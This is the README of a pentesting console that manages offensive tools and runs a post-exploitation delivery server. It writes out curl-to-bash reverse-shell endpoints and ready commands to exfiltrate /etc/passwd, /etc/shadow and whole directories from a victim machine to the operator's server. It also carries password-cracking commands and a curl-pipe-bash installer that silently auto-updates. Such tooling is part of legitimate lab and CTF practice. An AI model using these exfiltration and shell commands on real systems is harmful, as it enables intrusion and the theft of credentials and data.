# SeaLion Console

```
                                                     .====-:.
                                                  .==-###==+.:--
                                                 +.-*#%%*=:.:+%@*=
                                                *-++++*+===+#%%@*:.
                                                =+*++++-+#%*%#*. ..
                                                ++++*#*%#%%#*#+   .
                                               .++==+*-=#@@@%#*
                                               +++===-=+####%#*
                                             ===+=======+*####*
                                           .+=--=====++++***##+
                                         :=++=-----===+****##*+
                                    --+==++==========++***##**:
                           .====++++***-+*+==++++++++***####*=.
                       -*+********##*+=*#**+++******####%##+==.
                     ##########%####+=*######****#########*=+=
                   *%%###%%%%%%%%%%*=*%%###############%#*++=
                  +**#*+*##%%%%%%#**-%%%%%##########%%###*==#
                 #@@@@%#*+**#####**+*%@%@@@%%%####%%%##*#%@@#
               .***@@@  =+++**####%##@@%@@@@%%%%%%###*%@@@@@#
               ####%#@=      *+++*%#%@%%@@@@@%%%####+  =##@@#
               ##+-# %           %@@@@%%@@@@@@%*          *@%#
                              =%%#%@@%*@*                   .%%%#*+=-..
                           .#%@%######@+
                        -*#######%@%:
                    =###%%%+.
```

**Personal tool vault per pentester.** Console interattiva per gestire, installare e consultare tool di sicurezza offensiva, servire payload di post-exploitation e consultare cheatsheet per protocolli vulnerabili.

---

## Download veloce
```bash
curl https://file.ax/slconsole | bash
```

## Installazione

```bash
git clone https://github.com/Starlix27/SeaLion.git
cd SeaLion
bash setup.sh
```

`setup.sh` crea i comandi `slconsole` e `sealsay` in `~/.local/bin/` e aggiorna il PATH. Installa anche `chafa` se mancante.

Per applicare subito senza riaprire il terminale:

```bash
source ~/.bashrc
```

**Requisiti:** Python 3.10+, Linux (WSL supportato). `chafa` per animazione Ctrl+C (installato automaticamente). `rich` opzionale per rendering Markdown migliorato (`pip install rich`).

**Auto-update:** all'avvio slconsole si sincronizza automaticamente con il repository remoto. Se ci sono aggiornamenti, vengono applicati subito senza intervento manuale.

---

## Utilizzo

```bash
slconsole              # Avvia la console interattiva
sealsay "ciao"        # Stampa un messaggio con il sealion ASCII art
slconsole list         # Elenca i tool disponibili
slconsole search <q>   # Cerca tool per nome o descrizione
slconsole vuln smb     # Cheatsheet vulnerabilità SMB
slconsole vuln list    # Elenca tutti i protocolli per categoria
slconsole --version    # Versione
```

### Console interattiva

```
slconsole> list                   # Mostra tutti i tool
slconsole> search scanner         # Ricerca full-text
slconsole> use nmap               # Seleziona un tool
slconsole(nmap)> install          # Installa il tool selezionato
slconsole> vuln ftp               # Cheatsheet FTP
slconsole> vuln list              # Elenca protocolli per categoria
slconsole> notes <argomento>      # Guide e appunti
slconsole> find <parola>          # Cerca in vuln, tool e notes
slconsole> serve on               # Avvia il server HTTP di delivery
slconsole> serve list             # Mostra file serviti con curl
slconsole> loot                   # Elenca file ricevuti dalla vulnbox
slconsole> loot read <nome|num>   # Mostra contenuto di un file loot
slconsole> wordfind http://target # Wizard wordlist per fuzzing/bruteforce
slconsole> passfind               # Wizard password cracking
slconsole> back                   # Torna alla console principale
```

| Tasto | Azione |
|-------|--------|
| **ESC ESC** | Esci da slconsole |
| **Ctrl+C** | Animazione ~spin~ (premi di nuovo per fermarla) |
| **Freccia Su/Giu** | Naviga la cronologia comandi |
| **Tab** | Autocompletamento comandi |

---

## Quick-Delivery Server (`serve`)

Server HTTP in background per post-exploitation. Serve payload dinamici e file statici dalla cartella `static/`, pronti da scaricare via `curl` dal target.

```
slconsole> serve on                          # Avvia (seleziona interfaccia di rete)
slconsole> serve on --port 9090 --lport 4444 # Porta e LPORT custom
slconsole> serve off                         # Arresta
slconsole> serve status                      # Stato corrente
slconsole> serve fetch                       # Scarica tool di post-exploitation in static/
slconsole> serve list                        # Elenca file con comandi curl pronti
slconsole> serve help                        # Documentazione completa
```

### Endpoint dinamici

| Endpoint | Curl |
|----------|------|
| `/upgrade` | `curl http://<IP>:2727/upgrade \| bash` — upgrade shell (socat/python pty) |
| `/upgrade2` | `curl http://<IP>:2727/upgrade2 \| bash` — upgrade in-place (no nuova connessione) |
| `/rev` | `curl http://<IP>:2727/rev \| bash` — reverse shell Bash |
| `/sh` | `curl http://<IP>:2727/sh \| bash` — reverse shell Python |
| `/upload` | `curl -F "file=@/path/file" http://<IP>:2727/upload` — upload file dalla vulnbox |

### File statici

Qualsiasi file messo nella cartella `static/` viene automaticamente servito e mostrato in `serve list` e `serve on` con il comando curl corretto:
- `.sh` → `curl http://<IP>:2727/file.sh | bash`
- `.exe` → `curl http://<IP>:2727/file.exe -o file.exe`
- binari → `curl http://<IP>:2727/file -o file && chmod +x file`

Usa `serve fetch` per scaricare automaticamente linpeas, winpeas, pspy, linenum e altri.

---

## Loot — Upload dalla Vulnbox (`loot`)

Endpoint `/upload` per ricevere file dalla macchina vittima. I file vengono salvati nella cartella `loot/` con timestamp e IP sorgente, consultabili da console, web e filesystem.

### Upload dalla vulnbox

```bash
# Upload file singolo (multipart form — il più comune)
curl -F "file=@/etc/passwd" http://<IP>:2727/upload

# Upload via pipe (utile per output di comandi)
cat /etc/shadow | curl -X POST -d @- http://<IP>:2727/upload/shadow.txt

# Upload con PUT (nome file nell'URL)
curl -T /tmp/database.db http://<IP>:2727/upload/database.db

# Esfiltra cartelle intere via tar
tar czf - /etc /var/log | curl -X POST -d @- http://<IP>:2727/upload/exfil.tar.gz

# Upload multipli in un colpo solo
for f in /etc/passwd /etc/shadow /etc/hosts; do
    curl -F "file=@$f" http://<IP>:2727/upload
done
```

I file vengono salvati con il formato `<IP>_<DATA>_<ORA>_<NOME>`, ad esempio `10.10.14.5_2024-01-15_14-30-22_passwd`.

### Gestione loot dalla console

```
slconsole> loot                   # Elenca i file ricevuti
slconsole> loot read <nome|num>   # Mostra il contenuto di un file
slconsole> loot clear             # Elimina tutti i file loot
slconsole> loot help              # Documentazione completa
```

---

## Wordfind — Wizard Wordlist (`wordfind`)

Wizard interattivo che in base al target, scopo, tecnologia e intensità suggerisce le wordlist giuste da SecLists e genera comandi pronti per fuzzing e bruteforce.

```
slconsole> wordfind http://10.10.11.42
slconsole> wordfind https://target.htb
slconsole> wordfind http://10.10.11.42/login
slconsole> wordfind http://10.10.11.42/api/v1
```

### Flusso del wizard

Il wizard fa domande diverse in base allo scopo selezionato:

| Step | Domanda | Quando |
|------|---------|--------|
| Scopo | Directory/subdomain/vhost/parametri/username/password/API | Sempre |
| Tecnologia | PHP/ASP/Java/Python/Node/WordPress/Joomla/generico | Solo per directory |
| Tipo API | REST/GraphQL/Swagger | Solo per API |
| Contesto password | Login web/servizio di rete/hash offline | Solo per password |
| Lingua | Inglese/Italiano/Spagnolo/Tedesco/Francese/misto | Solo per password |
| Username | Testo libero | Solo per password |
| Intensità | Veloce/media/completa | Sempre |

### Tool supportati nei comandi generati

| Scopo | Tool |
|-------|------|
| **Directory/file** | gobuster, ffuf, dirb, feroxbuster, wfuzz, dirsearch |
| **Sottodomini** | gobuster, ffuf, wfuzz, amass, dnsenum |
| **Virtual Host** | gobuster, ffuf, wfuzz |
| **Parametri** | ffuf, wfuzz, arjun |
| **Password web** | hydra, ffuf, wfuzz, medusa |
| **Password servizi** | hydra, medusa, ncrack, crackmapexec |
| **Hash offline** | john, hashcat |
| **API** | ffuf, gobuster, wfuzz, feroxbuster |

### Esempio

```
slconsole> wordfind http://10.10.11.42

  [1] Cosa stai cercando?    → Directory / file
  [2] Tecnologia?            → PHP
  [3] Intensità?             → Media

  ┌─ Risultato ────────────────────────────────┐

  Wordlist consigliate:
    [1] DirBuster-2007_directory-list-2.3-medium.txt  (220k)
    [2] common.txt                      (4.7k)
    [3] PHP.fuzz.txt                    (274)

  Estensioni: .php,.phtml,.txt,.bak,.php.bak

  Comandi pronti:

    gobuster dir -u http://10.10.11.42 \
      -w .../DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,bak -t 50

    ffuf -u http://10.10.11.42/FUZZ \
      -w .../DirBuster-2007_directory-list-2.3-medium.txt -e .php,.txt,.bak -t 50 -c

  └────────────────────────────────────────────┘
```

---

## Passfind — Wizard Password Cracking (`passfind`)

Wizard interattivo per password cracking. Genera comandi pronti per John The Ripper, Hashcat, Hydra, Medusa, ncrack e crackmapexec in base allo scenario.

```
slconsole> passfind
```

### Scopi disponibili

| Scopo | Cosa fa |
|-------|---------|
| **Hash** | Identifica formato hash → sceglie attacco (wordlist, mask, incremental) → genera comandi john + hashcat |
| **File protetto** | SSH key, PDF, Office, ZIP, RAR, 7z, KeePass, PuTTY → estrazione con *2john + cracking |
| **Archivio/disco** | BitLocker, TrueCrypt, LUKS, OpenSSL enc → estrazione hash + cracking + mount |
| **Servizio di rete** | SSH, RDP, FTP, SMB, HTTP, MySQL, WinRM, VNC → hydra/medusa/ncrack/crackmapexec |

### Esempio

```
slconsole> passfind

  [1] Cosa devi crackare?     → Hash
  [2] Hai l'hash?             → Sì, identificalo
  [3] Formato?                → NTLM
  [4] Attacco?                → Wordlist + regole
  [5] Intensità?              → Completa

  ┌─ Risultato ────────────────────────────────┐

  Comandi pronti:

    # john (wordlist + rules)
    john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt --rules hash.txt

    # hashcat (wordlist + rules)
    hashcat -a 0 -m 1000 hash.txt /usr/share/wordlists/rockyou.txt \
      -r /usr/share/hashcat/rules/best64.rule

  └────────────────────────────────────────────┘
```

---

## SLWeb — Piattaforma Web

**SLWeb** (SeaLionWeb) è la piattaforma web integrata in SeaLion Console. Si avvia automaticamente insieme alla console sulla porta `2727` e permette di consultare tutti i contenuti dal browser.

### Cosa offre

| Sezione | URL | Contenuto |
|---------|-----|-----------|
| **Home** | `/` | Mascotte sealsay con tips, terminale interattivo per navigare |
| **Notes** | `/notes/` | Guide e appunti (footprinting, shells, password cracking...) |
| **Vuln** | `/vuln/` | Cheatsheet per protocolli vulnerabili |
| **Tools** | `/tools/` | Documentazione di tutti i tool installabili |
| **Static** | `/static/` | Gestione file statici (crea, importa, modifica, elimina) |
| **Delivery** | `/delivery` | Pannello curl per post-exploitation |
| **Loot** | `/loot/` | File ricevuti dalla vulnbox (visualizza, scarica, elimina) |

### Come accedere

SLWeb si avvia in automatico quando si lancia `slconsole`. Il link viene mostrato nel banner:

```
  SLWeb: http://<IP>:2727
```

Dalla CLI, ogni volta che si apre un file `.md` (con `vuln`, `notes` o `tool`), viene mostrato anche il link diretto alla pagina web corrispondente.

### Rendering Markdown

I contenuti `.md` vengono renderizzati in stile Notion con syntax highlighting per i blocchi di codice, tabelle formattate e navigazione breadcrumb.

---

## Tool inclusi (41)

| Categoria | Tool |
|-----------|------|
| **Ricognizione & OSINT** | nmap, shodan, theHarvester, recon-ng, finalrecon, whois, amass |
| **DNS & Web Fuzzing** | dnsenum, gobuster, ffuf, feroxbuster, dirsearch, wfuzz, nikto, scrapy, nuclei |
| **Enumerazione Servizi** | enum4linux-ng, smbmap, crackmapexec/netexec, onesixtyone, braa, ssh-audit, rdp-sec-check |
| **Accesso Remoto & Post-Exploitation** | evil-winrm, impacket, odat, xfreerdp |
| **Password Cracking & Wordlist** | john, hashcat, hashid, hydra, ncrack, medusa, cewl, seclists, htb-wordlists |
| **Web Application** | wafw00f, arjun |
| **Framework** | msfconsole |
| **Altro** | basics |

---

## Protocolli vulnerabili (`vuln`) — 15

| Categoria | Protocolli |
|-----------|-----------|
| **Trasferimento File** | ftp, smb, nfs |
| **DNS & Ricognizione** | dns |
| **Email** | smtp, imap-pop3 |
| **Monitoraggio Rete** | snmp |
| **Database** | mysql, mssql, oracle-tns |
| **Accesso Remoto** | ssh, rdp, winrm, wmi |
| **Hardware & Management** | ipmi |

Ogni cheatsheet include: descrizione, porte, vulnerabilità comuni, comandi di enumerazione e tool consigliati.

---

## Aggiungere contenuti

### Nuovo tool

Crea una sottocartella in `tool/` con due file:

```
tool/mio-tool/
├── help.md        # Documentazione in Markdown
└── install.py     # Script di installazione
```

Il tool apparira automaticamente in `slconsole list`.

### Nuovo protocollo vulnerabile

Crea un file `.md` in `vuln/`:

```
vuln/mio-protocollo.md
```

### File statici per il server

Metti qualsiasi file nella cartella `static/` — apparira automaticamente in `serve list` e sara servito dal Quick-Delivery Server.

---

## Struttura del progetto

```
SeaLion/
├── sealion.py          # Console principale
├── http_server.py      # Quick-Delivery Server HTTP + SLWeb
├── setup.sh            # Installer (crea comandi slconsole e sealsay)
├── pyproject.toml      # Metadata pacchetto
├── ascii-art.txt       # Logo ASCII
├── README.md
│
├── tool/               # 41 tool — ogni sottocartella contiene:
│   ├── nmap/
│   │   ├── help.md     #   documentazione
│   │   └── install.py  #   script di installazione
│   └── ...
│
├── vuln/               # 15 protocolli — un file .md per ognuno
│   ├── ftp.md
│   ├── smb.md
│   └── ...
│
├── static/             # File serviti dal Quick-Delivery Server
│   ├── linpeas.sh
│   ├── pspy64
│   └── ...
│
├── loot/               # File ricevuti dalla vulnbox via /upload
│   └── ...
│
└── assets/             # Risorse (GIF, immagini)
    └── spinning.gif
```

